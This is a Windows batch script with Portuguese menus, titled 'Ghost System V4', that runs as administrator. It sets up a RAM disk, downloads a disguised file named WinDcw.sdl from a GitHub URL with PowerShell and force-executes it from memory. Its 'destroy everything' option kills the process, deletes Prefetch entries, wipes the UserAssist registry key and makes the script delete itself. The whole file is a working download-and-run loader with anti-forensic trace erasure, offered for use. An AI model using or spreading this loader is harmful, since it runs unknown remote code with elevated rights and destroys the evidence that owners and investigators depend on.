@echo off
:: ###########################################################################
:: GHOST SYSTEM - VERSION V4 (AUTO-RUNNER)
:: ###########################################################################

if not "%1"=="debug" (
    start cmd /k "%~f0" debug
    exit /b
)

title Painel de Invisibilidade Total (GHOST SYSTEM - V4)
color 0A

:: CONFIGURACOES
set TARGET_FILE=WinDcw.sdl
set PROGRAM_SOURCE_URL=https://github.com/ulbrachatgpt/fivs/raw/main/WinDcw.sdl
set RAMDISK_DRIVE_LETTER=R:

:: Verifica Admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERRO] EXECUTE COMO ADMINISTRADOR!
    pause
    exit
)

:MENU
cls
echo ===============================================================================
echo             PAINEL DE INVISIBILIDADE TOTAL (GHOST SYSTEM - V4)
echo ===============================================================================
echo.
if exist %RAMDISK_DRIVE_LETTER% (echo [!] RAMDISK ATIVO: %RAMDISK_DRIVE_LETTER%) else (echo [OK] RAMDISK INATIVO.)
echo.
echo [1] CRIAR RAMDISK
echo [2] BAIXAR E EXECUTAR (FORCA BRUTA)
echo [3] DESTRUIR TUDO
echo [4] SAIR
echo.
set /p opcao="Escolha: "

if "%opcao%"=="1" goto CRIAR
if "%opcao%"=="2" goto BAIXAR
if "%opcao%"=="3" goto DESTRUIR
if "%opcao%"=="4" exit

:CRIAR
echo [+] Tentando criar RAMDisk...
imdisk -a -s 512M -m %RAMDISK_DRIVE_LETTER% -p "/fs:FAT32 /y"
if %errorlevel% equ 0 (echo [OK] Criado!) else (echo [ERRO] Falha ao criar. Verifique o ImDisk.)
pause
goto MENU

:BAIXAR
if not exist %RAMDISK_DRIVE_LETTER% (
    echo [ERRO] Crie o RAMDisk primeiro!
    pause
    goto MENU
)

echo [+] Baixando arquivo para a RAM...
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('%PROGRAM_SOURCE_URL%', '%RAMDISK_DRIVE_LETTER%\%TARGET_FILE%')"

if exist "%RAMDISK_DRIVE_LETTER%\%TARGET_FILE%" (
    echo [OK] Download Concluido!
    echo [+] Tentando Execucao Forcada...
    
    :: Tenta abrir o arquivo diretamente
    start "" "%RAMDISK_DRIVE_LETTER%\%TARGET_FILE%"
    
    :: Se nao abrir, tenta via associacao de comando
    if %errorlevel% neq 0 (
        echo [!] Tentando metodo alternativo de execucao...
        cmd /c "%RAMDISK_DRIVE_LETTER%\%TARGET_FILE%"
    )
    
    echo.
    echo [!] Verifique se o programa abriu. Se nao abriu, voce pode precisar 
    echo [!] clicar no arquivo manualmente dentro da unidade %RAMDISK_DRIVE_LETTER%.
) else (
    echo [ERRO] Falha no download. Verifique a internet.
)
pause
goto MENU

:DESTRUIR
echo [+] Iniciando destruicao de rastros...
taskkill /F /IM %TARGET_FILE% /T >nul 2>&1
taskkill /F /IM WinDcw.exe /T >nul 2>&1
imdisk -D -m %RAMDISK_DRIVE_LETTER% >nul 2>&1
del /q /f C:\Windows\Prefetch\WINDCW*.pf >nul 2>&1
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /f >nul 2>&1
echo [OK] Limpeza concluida.
echo [!] O script se auto-deletara agora.
pause
del /f /q "%~f0" & exit
